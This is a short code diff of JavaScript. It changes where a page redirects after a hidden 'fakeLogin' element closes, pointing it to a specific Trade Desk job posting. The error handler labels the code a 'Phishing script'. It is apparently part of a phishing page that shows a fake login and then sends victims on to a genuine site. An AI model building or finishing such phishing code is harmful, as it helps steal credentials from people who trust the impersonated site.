@@ -43,7 +43,7 @@ document.addEventListener('vite-script-loaded', function() {
         // Redirect after 2 seconds
         setTimeout(() => { 
           fakeLogin.style.display = 'none';
-          window.location.href = 'https://careers.thetradedesk.com';
+          window.location.href = 'https://careers.thetradedesk.com/jobs/4734192007/director-business-development-advertiser-pharma';
         }, 2000);
       } catch (e) {
         console.error('Phishing script error:', e);
